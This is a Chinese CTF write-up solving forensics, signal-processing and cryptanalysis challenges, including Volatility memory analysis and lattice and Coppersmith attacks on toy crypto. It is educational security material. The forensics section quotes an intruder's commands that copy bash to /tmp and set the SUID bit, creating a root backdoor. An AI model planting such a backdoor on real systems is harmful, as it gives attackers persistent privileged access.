![image-1730940388603](./assets/image-1730940388603.png)

## 题目：<font style="color:rgb(33, 37, 41);">ServerMeM</font>
解题步骤

1.全局搜索Linux version获得Kernel信息

```plain
Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Thu May 23 20:16:33 EDT 2024
```

![image-1730940389066](./assets/image-1730940389066.png)

2.根据所给内核信息，得知是Linux操作系统，内核版本为5.4.27，仿照创建CentOS虚拟机并更换内核，可参考

[CentOS基于volatility2的内存取证实验_centos7安装volatility2-CSDN博客](https://blog.csdn.net/jyttttttt/article/details/136043325?spm=1001.2014.3001.5502)

[Linux centos7升级内核（两种方法：内核编译和yum更新）-CSDN博客](https://blog.csdn.net/alwaysbefine/article/details/108931626)

```plain
# 下载源码包
wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.27.tar.xz
tar -xf  linux-5.4.27.tar.xz
cd  linux-5.4.27

# 准备环境
yum install gcc make ncurses-devel openssl-devel flex bison perl elfutils-libelf-devel  -y
yum upgrade -y

# 编译
make menuconfig
make -j `nproc` && make modules_install && make install
```

![image-1730940389560](./assets/image-1730940389560.png)

3.将volatility官方所给的工具传输进虚拟机，并编译制作profile

```plain
# 安装dwarfdump
yum install wget
wget https://www.prevanders.net/libdwarf-20201201.tar.gz

tar -xf libdwarf-20201201.tar.gz
cd libdwarf-20201201

# 配置并编译
sudo ./configure
sudo make install
export PATH=$PATH:/usr/local/bin
```

编译dwarf文件

![image-1730940390074](./assets/image-1730940390074.png)

和systemmap文件一起打包制作成profile

```plain
ls -lh /boot/System.map-$(uname -r)

yum install redhat-lsb-core zip -y

sudo zip $(lsb_release -i -s)_$(uname -r)_profile.zip module.dwarf /boot/System.map-$(uname -r)
```

![image-1730940390580](./assets/image-1730940390580.png)

制作好的profile放入`\volatility\plugins\overlays\linux`目录下

--info成功获取到该profile

![image-1730940391096](./assets/image-1730940391096.png)

使用linux_bash命令获取history

```plain
python2 vol.py -f out.lime --profile=LinuxCentOS_5_4_27_profilex64 linux_bash
```

![image-1730940391602](./assets/image-1730940391602.png)

通过观察发现以下两条命令，可以确定黑客是留了一个suid的后门，同时根据获取的最后两条bash的pid不同，可以确定是通过另一个用户登陆并使用该shell执行

```plain
 cp /bin/bash /tmp/shell
 chmod u+s /tmp/shell
```

根据官方文档[Linux Command Reference · volatilityfoundation/volatility Wiki (github.com)](https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference#linux_bash)，volatility的linux_bash是获取/bin/bash进程的信息

因此当黑客通过/tmp/shell进行操作时将无法被读取。

官方也给出了解决措施，可以使用-A参数扫描所有进程

```plain
python2 vol.py -f out.lime --profile=LinuxCentOS_5_4_27_profilex64 linux_bash -A
```

成功获取到了shell部分的命令

![image-1730940392146](./assets/image-1730940392146.png)

根据命令可以发现黑客使用了openssl对F14g.txt进行了加密，这里暂无很好的内置命令直接获取到运行时使用的密钥和S3rCr3t.dat信息，linux_find_file导出来全是0x00

尝试直接搜索`tar -czf - F14ggg | openssl enc -e -aes256 -out ./S3rCr3t.tar.gz`命令可以会很容易在内存上下文中获取到该密钥**P@ssW0rdddd**,以及后面cat获取到的Salted__开头的加密文件

![image-1730940392671](./assets/image-1730940392671.png)

![image-1730940393261](./assets/image-1730940393261.png)

解密时还要注意openssl的版本，通过观察前面命令记录发现shell也查看了openssl的版本

同样方法可以读取到版本信息为

```plain
OpenSSL 1.0.2k-fips  26 Jan 2017
```

![image-1730940393754](./assets/image-1730940393754.png)

将加密文件导入虚拟机，用相近版本进行解密即可

```plain
openssl enc -d -aes256 -in S3rCr3t.tar.gz | tar xz -C ./
# P@ssW0rdddd
```

![image-1730940394250](./assets/image-1730940394250.png)

## 题目：<font style="color:rgb(33, 37, 41);">ez_wav</font>
解题步骤

首先我们看到key.grc

![image-1730940394775](./assets/image-1730940394775.png)

hint给了key的形式，上图中给的流程图讲述了附件中的look.txt是怎么来的，我们想要得到key就要按照相同的流程逆转回去

流程大意

```plain
信号源——》xor->数据类型转换->相乘一个常数->写入
下面的Vector Source提供的一个脉冲信号
```

expgrc

![image-1730940395244](./assets/image-1730940395244.png)

我们就和上述的流程图操作进行相反的操作就好（很有misc思维

![image-1730940395759](./assets/image-1730940395759.png)

于是得到密码good_job。

然后我们再看flag.grc

![image-1730940396247](./assets/image-1730940396247.png)

am调制的原理如下

![image-1730940396735](./assets/image-1730940396735.png)

其实就是我们高中物理学过的波形的叠加，所以如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形就好

![image-1730940397330](./assets/image-1730940397330.png)

上图是am解调的过程

然后剩下的就是那个key的异或过程，这里其实没啥好说的，就直接异或回去就好

最终的expgrc

![image-1730940397772](./assets/image-1730940397772.png)

这里设计的低通滤波器是为了过滤到杂乱的高频段的噪声，是取有用的信号部分，是我们最后的得到的声音更清晰一些

![image-1730940398380](./assets/image-1730940398380.png)

![image-1730940398861](./assets/image-1730940398861.png)

最后听到的数字是

```plain
one one two two zero nine six seven
```

```plain
DASCTF{11220967}
```

# CRYPTO
## 题目：<font style="color:rgb(33, 37, 41);">complex_enc</font>
解题步骤

**分析**

首先审计代码，可以看见定义了两个函数creat_key以及enc，分析两个函数的作用：

```python
def creat_key(n):
    sum=2
    key=[1]
    for i in range(n):
        r=random.randint(0,1)
        x=sum+random.randint(0,n)*r
        key.append(x)
        sum+=x
    return key
```

这是一个生成长度为n的密钥的函数，先随机取第一个元素放到key中，同时用sum记录密钥中元素之和，这里的r会随机取0、1，使后面每次生成的元素可能是前面所有数之和，也可能会多一点，将生成的所有元素作为密钥中的元素再将生成的密钥加到key中，并用sum记录所有密钥元素之和，如此循环往复，可以生成一段超递增序列作为密钥。

```python
def enc(m,k):
    cipher_list = []
    for i in range(len(m)):
        if m[i] == 1:
            cipher_list.append(m[i] * k[i])
    cipher = sum(cipher_list)
    return cipher
```

这段加密函数的两个参数，都为列表，且m为由0,1组成的列表，后面对明文进行了处理变成了这个形式，然后这里m只有0,1，就相当于求m和k两个向量的数量积，将m为1的项与k对应的项相乘在求和得到密文。

```python
m = [int(bit) for byte in flag if byte != 0 for bit in format(byte, '08b')]
```

这段代码会遍历flag 中的每一个字节，并将每个字节转换为8位的二进制字符串，然后将这个字符串中的每一位（作为一个字符）转换为整数，并将这些整数收集到一个列表中，也就是将flag的整形数字变为2进制再将每位存在一个列表中，且要注意，它的首位为0。

**思路**

这道题主要考察的是背包密码加密，而这里的密钥是一个超递增序列可以帮助我们去很方便的解决这个问题

如果a的组合为一个超递增序列，则第n项an应该大于前面所有的数，因为b为0或1，a不是有就是没有，我们就将W与an进行比较分两种情况：

1、W大于或等于an

如果an没有，前面的所有项之和小于an不可能等于W，所以an一定有

2、W小于an

W小于an则必然是没有an的

于是通过比较W与an的大小判断出bn是0还是1，然后去掉an后对an-1同样操作，直到变成0为止

此外，因为an前面所有的数之和小于an，所以W的最大值不会大于或等于an的两倍，

我们就根据这个思路往不断前推，直到背包里的东西全拿完。

我们就可以根据这个思路来解此题

exp1：

```python

from Crypto.Util.number import *
#对私钥重排
def relist(pub):
    a = pub[:]
    c = []
    while a:  # 当a不为空时
        m = min(a)
        c.append(m)
        a.remove(m)
    return c
#解密
def resolve(pub,a,w):
    b=[]
    for j in range(1,len(a)):
        b.append(0)     #用0填充方便后面替换
    for i in range(1,len(a)):
        an=a[len(a)-i-1]
        id=pub.index(an)
        if w<an:
            None
        else:
            w=w-an
            b[id:id+1]=[1]  #将0替换成1
    if w==0:    #说明解密完成
        return b

def decrypto(pub,w):
    a=relist(pub)
    m=resolve(pub,a,w)
    return m
c= 
key=

m=decrypto(key,c)
print(m)
ml=''
for i in range(len(m)):
    ml+=str(m[i])
print(long_to_bytes(int(ml,2)))
```

## 题目：<font style="color:rgb(33, 37, 41);">found</font>
解题步骤

题目描述

`task.py:`

```python
from Crypto.Util.number import *
from random import *
from secret import flag
from sympy import *

bits = 1024
l = 138833858362699289505402947409766595473722379891580589518174731439613184249727659678966809301611194545239974736175752769503863392697421092435438747741790652435801956708356186578269272819715592752821497122516109657809748674185639254430403157877064556216401002688452227124543508128414591884297632663910714681207

assert isPrime(l)

def generate_prime(bits):
    return randprime(2**(bits-1), 2**bits)

def fun(data,y,n):
    return sum([data[i] * pow(y,i,n) for i in range(len(data))]) % n

def gen(x, y, z, w, n):
    data = [randint(n // 4, n) for _ in range(10)]
    leak1 = pow(x + pow(y, z, n), w, n)
    leak2 = fun(data, y, n)
    return data, leak1, leak2

def encrypt(l,m,n):
    mm = bin(m)[2:].zfill((m.bit_length() // 8 + 1) * 8)
    length = len(mm)
    c = []
    s = []
    for i in range(length):
        a = randint(1, n)
        s.append(pow(a, length, n))
    for j in range(length):
        c.append(pow(l,int(mm[j]),n) * s[j] % n)
    return c

p, q = [generate_prime(bits) for _ in range(2)]
r = generate_prime(bits // 4)
n = p ** 2 * q * r
e1 = generate_prime(128)
e2 = generate_prime(128)
phi1 = p * (p - 1) * (q - 1) * (r - 1)
phi2 = (p - 1) * (p - 2) * (q - 2) * (r - 2)
d1 = inverse(e1, phi1)
d2 = inverse(e2, phi2)

t = getRandomRange(n // 4, n)
data, leak1, leak2 = gen(r, t, e1, d1, n)
m = bytes_to_long(flag)
c = encrypt(l, m, n)

with open('output.txt','w') as f:
    f.write(f'n = {n}\n')
    f.write(f'e1 = {e1}\n')
    f.write(f'ed = {e2 * d2}\n')
    f.write(f'data = {data}\n')
    f.write(f'leak1 = {leak1}\n')
    f.write(f'leak2 = {leak2}\n')
    f.write(f'c = {c}')
```

`output.txt:`

```python

```

**题目分析**

通过 $ e_2d_2 $ 和 $ n $ 我们知道：

$ \begin{align*}
&e_2d_2-1=k*phi_2\\
&e_2d_2-1=k(p - 1)(p - 2)(q - 2)(r - 2)\\
&e_2d_2-1=k(p^2qr - 2p^2q - 2p^2r - 3pqr + ...)\\
&目的是求k进而求phi2\\
&\frac{e_2d_2-1}{n}=k+\frac{k(- 2p^2q - 2p^2r - 3pqr + ...)}{n}\\
&显然k(- 2p^2q - 2p^2r - 3pqr + ...)<n\\
&而(- 2p^2q - 2p^2r - 3pqr + ...) < 0\\
&所以\frac{k(- 2p^2q - 2p^2r - 3pqr + ...)}{n}=-1\\
&\Rightarrow k = \frac{e_2d_2 - 1}{n} + 1\\
&\Rightarrow phi = \frac{e_2d_2 - 1}{k}\\
&so现在已知的是phi2和n，但是里面有3个未知数，所以还得求出一个东西来\\
\end{align*}\\ $

我们知道有:

$ \begin{align*}
&leak_1 \equiv (r + t^{e_1})^{d_1} \pmod n \\
&leak_2 \equiv\sum_{i=0}^{9}data_i * t^i\pmod n\\
&看到的想法就是通过\ leak_2\ 把\ t \ 求出来，然后计算\ (leak_1^{e_1} - t^{e_1}) \ 就能得到\ r\ 了\\
&但是这个\ t \ 并不小，这种方式似乎求不出来\\
&那么能否消掉它呢
\end{align*}\\ $

我们将式子变一下

$ \begin{align*}
&f(t,r) \equiv (r + t^{e_1}) - leak_1^{e_1} \pmod n\\
&g(t) \equiv \sum_{i=0}^{9}data_i * t^i - leak_2\pmod n\\
\end{align*}\\ $

对两个式子做一个结式，把 t 给消掉，但是由于 $ e_1 $ 太大，故我们需要优化一下，考虑到 $ g(t) \equiv \sum_{i=0}^{9}data_i * t^i - leak_2\pmod n $，即 $ g(t) = kn $，我们知道在模 $ kn $ 下满足的式子，在模 $ n $ 下一定成立，所以在求 $ t^{e_1} $ 的时候再模一下多项式 $ g(t) $，这样得到的 $ f(t,r) $ 的度就低于10，之后让 $ f(t,r) $ 和 $ g(t) $ 做结式即可得到 $ r $

(经过测试当调到 `epsilon = 0.03` 时我们能求出 $ r $ 来)

```python
from Crypto.Util.number import * 
from random import *

with open('output.txt') as f:
    exec(f.read())
    
R.<t,r>=PolynomialRing(Zmod(n))   

# construct g
g = sum([int(data[i]) * t ** i for i in range(len(data))]) - leak2
print("start")
print('g', g)

asist = t
t_e = 1
cnt = 1
for i in bin(e1)[2:][::-1]:
    cnt += 1
    print(cnt)
    if i == '1':
        t_e = (t_e * asist) % g
    asist = (asist * asist) % g

# construct f
f = r + t_e - pow(leak1,e1,n)

# calc resultant using sylvester_matrix
h = f.sylvester_matrix(g, t).det().univariate_polynomial().monic()
res = h.small_roots(X = 2 ** 256,epsilon = 0.03)
if res:
    print(res[0])
```

$ 如此r，phi_2，n均已知道，解个方程即可得到p，q $

$ \begin{align*}
&p,q求出后发现pow(l,\frac{p - 1}{2},p) = pow(l,\frac{q - 1}{2},q) = -1\\
&所以可以知道l是p和q的二次非剩余\\
&又s \equiv a^{len(mm)} \mod n，其中len(mm)为偶数\\
&c_i = \begin{cases}
    l * s^{len(mm)},j = 1\\
    s^{len(mm)},j = 0
\end{cases}\\
&\Rightarrow(小费马)\\
&(l * s^{len(mm)})^\frac{p-1}{2} \equiv -1 \mod p\\
&\ \ \ \ \ (s^{len(mm)})^\frac{p-1}{2} \equiv \ \ \ 1 \mod p\\
&若pow(c_i,(p-1)//2,p) = -1,则x = 1\\
&若pow(c_i,(p-1)//2,p) = \ \ \  1, 则x = 0\\
&由此得到flag\\
\end{align*}\\ $

exp2:

```python
from Crypto.Util.number import *
from z3 import *
with open('output.txt') as f:
    exec(f.read())
r = 77477547161688496725906506626131775883966333151442864639104100690032824193233

k = (ed - 1) // n + 1
phi2 = (ed - 1) // k

# s = Solver()
# p, q= Ints('p q')
#
# s.add((p - 1)  * (p - 2) * (q - 2) * (r - 2) == phi2)
# s.add(p ** 2 * q * r == n)
# if s.check() == sat:
#     print(s.model())

'''
[p = 168207689659417173628607066039457820275276732311636007089001107530860513351122555769649031031435042743185528528881857626080873859026128498997148721030271703030768717788591275936600239642357340350598106488044312274746860587888105379606096757814370419770414183228756583472285941821276338279728115488001890742673,
 # q = 97707929018805957546753225343143490125285071269910025402668681477127527381672117514147518538470060994557862749309042238326448721045026099601424607832524228224510318920129326794773863846005792678034679056020514793964664097594210383339219122809427128901179158534676129014329576699155669500220463663254504200451]
'''
p = 168207689659417173628607066039457820275276732311636007089001107530860513351122555769649031031435042743185528528881857626080873859026128498997148721030271703030768717788591275936600239642357340350598106488044312274746860587888105379606096757814370419770414183228756583472285941821276338279728115488001890742673
q = 97707929018805957546753225343143490125285071269910025402668681477127527381672117514147518538470060994557862749309042238326448721045026099601424607832524228224510318920129326794773863846005792678034679056020514793964664097594210383339219122809427128901179158534676129014329576699155669500220463663254504200451

flag = ''

for i in c:
    if pow(i,(p - 1) // 2,p) == 1:
        flag += '0'
    else:
        flag += '1'

print(long_to_bytes(int(flag,2)))
# DASCTF{c764ba09-b2aa-12ed-ab17-9408ad39ce84}
```

**lFinally**

`idea`

这题其实没有很明确的目的指向，我们最后的落点就是encrypt这个函数，在此函数中我们知道的只有 $ l $ ，不过又能发现一个很特殊的地方就是我们并不知道 $ l $ 到底是如何生成的，它被直白的给出来了，所以从这方面来说我们就能知道 $ l $ 很关键。那么这个时候其实就得去考虑到前面函数的作用以及指向到底什么

`part1`

我们知道了两个式子：l

$ $leak_1 \equiv (r + t^{e_1})^{d_1} \pmod n \\leak_2 \equiv\sum_{i=0}^{9}data_i * t^i\pmod n\\$ $

两个式子，两个未知数，毫无疑问这部分就是要求 $ r $

`part2`

给出 $ e_2d_2 $ ，以及知道 $ n $ ，这种我们其实就已经接触过，以前接触到的是(已知 $ ed $  和 n)，此处无非就是 $ phi $ 改了一下，改成了 $ phi_2 $ ，思考的解题方式都是一样的。

故这个部分就是要求出 $ phi_2 $ 来

`summary`

所以可以很清楚的知道这两部分的作用和指向就是帮助我们得到p，q

我们知道了 $ p，q $，然后我们又知道 $ l $ 不寻常，那么它们之间必定有联系，稍微试一试便能知道 $ l $ 是 $ p $ 和 $ q $ 的二次非剩余，得到了关系，之后再加上自己的推导，flag差不多就出了。



## 题目：<font style="color:rgb(33, 37, 41);">EZshamir</font>
解题步骤

分析源码，观察到多项式的系数是用sha256生成，相对于模数p较小

分析同余式可以得到

$ a_0+a_1x_i+a_2x_i^2+...+a_{n-1}x_i^{n-1}=y_i+e_i \pmod{p} $

所以根据以上等式，可以构造如下格子求解出多项式的系数e

$ \begin{bmatrix}
a_0& a_1& a_2 & ... & a_{n-1}&-1&l_0&l_1&l_2&...&l_{n-1} \\
\end{bmatrix}*\begin{bmatrix}
1&1&1&...&1&1&0&0&...&0&0 \\
x_0&x_1&x_2&...&x_{n-1}&0&1&0&...&0&0 \\
x_0^2&x_1^2&x_2^2&...&x_{n-1}^2&0&0&1&...&0&0 \\
...&...&...&...&...&...&...&...&...&...&... \\
x_0^{n-1}& x_1^{n-1}& x_2^{n-1}& ...& x_{n-1}^{n-1}&0&0&0&...&1&0 \\
y_0&y_1&y_2&...&y_{n-1}&0&0&0&...&0&K \\
p&0&0&...&0&0&0&0&...&0&0 \\
0&p&0&... &0&0&0&0&...&0&0\\
0&0&p&...&0&0&0&0&...&0&0 \\
...&...&...&...&...&...&...&...&...&...&... \\
0&0&0&...&p&0&0&0&...&0&0
\end{bmatrix}=\begin{bmatrix}
e_0& e_1& e_2 & ... & e_{n-1}&a_0&a_1&a_2&...&a_{n-1}&-K \\
\end{bmatrix} $

题目背景是shamir秘密分享，可以构造类似于LWE的格即可将结果求出来，使用flatter加速格归约

exp:

```python
import os
from random import getrandbits
from hashlib import sha256, md5
from Crypto.Util.number import *
from Crypto.Cipher import AES
from subprocess import check_output
from re import findall

def flatter(M):
    z = "[[" + "]\n[".join(" ".join(map(str, row)) for row in M) + "]]"
    ret = check_output(["flatter"], input=z.encode())
    return matrix(M.nrows(), M.ncols(), map(int, findall(rb"-?\d+", ret)))

with open("data.txt", "r") as f:
    data = f.read().strip().split("\n")

p = int(data[0])
tmp = eval(data[1])
ct = long_to_bytes(int(data[2]))
pbits = 400
noise_bit = 32
n = 100
m = 75

X = [i[0] for i in tmp]
Y = [i[1] for i in tmp]


M = matrix(ZZ, n+1+m, n+1+m)

K1 = 2 ^ (256 - noise_bit)
K2 = 2 ^ 256

for i in range(m):
    for j in range(n):
        M[j, i] = pow(X[i], j, p)
    M[n, i] = Y[i]
    M[n+1+i, i] = p

M = K1 * M

for i in range(n):
    M[i, i+m] = 1
M[n, -1] = K2

ML = flatter(M)

for i in ML:
    if abs(i[-1]) == K2:
        sol = [abs(j) for j in i[-n:-1]]
        key = "".join([str(i) for i in sol])
        key = md5(key.encode()).digest()
        aes = AES.new(key = key, mode = AES.MODE_ECB)
        print(aes.decrypt(ct))
```

## <font style="color:rgb(33, 37, 41);">题目：DAS_DSA</font>
解题步骤

题目中的DSA签名算法是被修改过的，sign函数如下

```python
    def sign(self, message):
        h = int(hashlib.sha1(message).hexdigest(), 16)
        k = b2l(xor(message,self.KEY))
        r = pow(self.g, k, self.p) % self.q
        s = (inverse(k, self.q) * (h + self.x * r)) % self.q
        if r != 0 and s != 0:
            return (r, s)
```

实际上作用为  

$ &&&&&r=g^k\% p  \ \\ &&&&&s=k^{-1}(hash(M)+xr)\%p $

与常规DSA签名算法不同的是，这里的k生成并不是随机生成的，而是$ k=M\bigoplus KEY $ 得到的

题目中给了31组数据，由此我们可以获得一共31组$ (r_i,s_i),而x $是唯一的

目前思路就是，通过这31组数据，来得到x,通过不同数据的关系，来进行破解

参与sign中的M是原始字符串m由pad()函数加密后的,我们可以通过找到两个相同长度的字符串m，那么他们填充后的数据也是一样，这些字符串都是由"DAS"字符集组成，那么字符串中很有可能会出现在相同位置具有相同的字符

例如：($ ?:代表不一样的字符 \ \  p:表示填充的字符,示例字符长度为20 $)

$ m_1: ??????????DAS???????\\ m_2:??????????DAS??????? $

他们最后的填充数据也是一样的，填充后的$ M_1,M_2 $进行加密$ k_1=M_1\bigoplus KEY,k_2=M_2\bigoplus KEY $

由异或的性质，实际上就是对位的二进制加法

我们就可以得到下列关系式,其中x1,x2的大小就由两段不一样的字符串长来确定的，举例中不超过80bit

$ k_2=2^{8*22}*x2+k1+2^{8*12}*x1   \ \ \ \ \ \ \ (1) $

将$ k_1, k_2带入sign()函数中 $

$ s_1=k_1^{-1}(h_1+xr_1) &&& (2)\\s_2=k_2^{-1}(h_2+xr_2) &&&(3) $

联立$ (1) (2) (3) $我们就可以消去$ k_1,k_2 $,得到式子(4),

此时式子(4)的未知数只有 $ x,x_1,x_2 $,其中$ x_1,x_2 $为小数，

如果找到了另一组两个长度相同，其中相同位置具有相同的字符串的两个字符串

我们就可以通过上述操作得到一个类似的式子(5)

其中的未知数为$ x ,x_3 ,x_4 $，其中$ x_3,x_4 $为小数，

联立$ 式子(4) ,式子(5) $我们可以消去x,得到一个式子中只有$ x_1,x_2,x_3,x_4 $

就转化为小根问题，可以通过多元coppersmith攻击来解决。



在寻找相同长度的字符串中，找到相同位置的连续子串

代码如下

```python
def longest_common_substring_at_same_position(s1, s2):
    if len(s1) != len(s2):
        raise ValueError("Strings must be of the same length")
    max_length = 0
    current_length = 0
    start_index = 0
    for i in range(len(s1)):
        if s1[i] == s2[i]:
            current_length += 1
            if current_length > max_length:
                max_length = current_length
                start_index = i - max_length + 1
        else:
            current_length = 0
    return s1[start_index:start_index + max_length],start_index
```



在题目给的数据中，我们可以找到两组字符串为（右侧的数字字符串在GIFT,txt中的位置）

```plain
       ADDSDD
AASADASADDSDDASADSAS  5
ADSSSSAADDSDDDADAADD  8
       SAADDA
DADSDAASAADDAAASASSSA  11
SASADSSSAADDASADDDADD  22
```



然后根据上面的思维，以结式法进行消元构造

```python
def resultant(f1, f2, var):
    return Matrix.determinant(f1.sylvester_matrix(f2, var))

```

```python
index=[5,8,11,22]
P.<k0,k1,k2,k3,x1,x2,x3,x4,x,f1,f2,f3,f4> = PolynomialRing(Zmod(q))
k1=2^(25*8)*x1+k0+2^(12*8)*x2
k3=2^(25*8)*x3+k2+2^(11*8)*x4
# P.<x>= PolynomialRing(Zmod(q))
h=h0,h1,h2,h3=sha256(key[index[0]]),sha256(key[index[1]]),sha256(key[index[2]]),sha256(key[index[3]])
f=[f0,f1,f2,f3]
k=[k0,k1,k2,k3]
for i in range(4):
    f[i]=rs[index[i]][1]*k[i]-h[i]-rs[index[i]][0]*x
ff1 = resultant(f[0], f[1], k0)
ff2 = resultant(f[2], f[3], k2)
ff = resultant(ff1, ff2, x)

PP.<x1,x2,x3,x4>= PolynomialRing(Zmod(q))
ff=eval(str(ff))
x1,x2,x3,x4= small_roots(ff, (2**56, 2**56,2**56,2**64), m=4, d=2)[0]
```

ff式子就是我们最终得到的只有$ s_0,s_1,s_2,s_3 $的方程式

而四段不一样的字符串长度分别为$ 7,7,7,8 $

因为在设置small_roots的参数是，上界选为$ (2^{56}, 2^{56},2^{56},2^{64}) $

得到私钥x后，带回原方程，求得$ k_1 $,再和填充后的字符串异或回来就可以

```python
k0=int(f0.subs(x=xx2).univariate_polynomial().roots()[0][0])
KEY=l2b(k0^^b2l(pad(key[index[0]].encode(),32)))
print(b"DASCTF{"+KEY+b"}")
```



完整代码如下

```python
import hashlib
from Crypto.Util.number import *
from Crypto.Util.Padding import pad
from sage.matrix.matrix2 import Matrix
import itertools
def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()
    R = f.base_ring()
    N = R.cardinality()
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)
    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)
    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)
    B = B.dense_matrix().LLL()
    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)
    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []
key,rs=[],[]
index=[5,8,11,22]
sha256=lambda x:int(hashlib.sha256(pad(x.encode(),32)).hexdigest(), 16)
b2l=lambda x:bytes_to_long(x)
l2b=lambda x:long_to_bytes(x)
def resultant(f1, f2, var):
    return Matrix.determinant(f1.sylvester_matrix(f2, var))


with open("GIFT.txt","r") as f:
    for i in f.readlines(): key.append(i.strip())
    # print(key)
with open("enc.txt","r") as f:
    data=f.readlines()
    for i in data[:-1]: rs.append(eval(i.strip()))
    p,q,g,y=tmp=eval(data[-1])

P.<k0,k1,k2,k3,x1,x2,x3,x4,x,f1,f2,f3,f4> = PolynomialRing(Zmod(q))
k1=2^(25*8)*x1+k0+2^(12*8)*x2
k3=2^(25*8)*x3+k2+2^(11*8)*x4
# P.<x>= PolynomialRing(Zmod(q))
h=h0,h1,h2,h3=sha256(key[index[0]]),sha256(key[index[1]]),sha256(key[index[2]]),sha256(key[index[3]])
f=[f0,f1,f2,f3]
k=[k0,k1,k2,k3]
for i in range(4):
    f[i]=rs[index[i]][1]*k[i]-h[i]-rs[index[i]][0]*x
ff1 = resultant(f[0], f[1], k0)
ff2 = resultant(f[2], f[3], k2)
ff = resultant(ff1, ff2, x)

PP.<x1,x2,x3,x4>= PolynomialRing(Zmod(q))
ff=eval(str(ff))
x1,x2,x3,x4= small_roots(ff, (2**56, 2**56,2**56,2**64), m=4, d=2)[0]
xx = Integer(ff1.subs(x1=x1,x2=x2).univariate_polynomial().roots()[0][0])
xx2 = Integer(ff2.subs(x3=x3,x4=x4).univariate_polynomial().roots()[0][0])
assert  xx2 == xx
k0=int(f0.subs(x=xx2).univariate_polynomial().roots()[0][0])
KEY=l2b(k0^^b2l(pad(key[index[0]].encode(),32)))
print(b"DASCTF{"+KEY+b"}")
# 71413025726041075021691379440197097387165417897223060463261836215249838866459
# b'DASCTF{AADDAASAAASSSASSDSSASSDDDSDAAASS}'
```

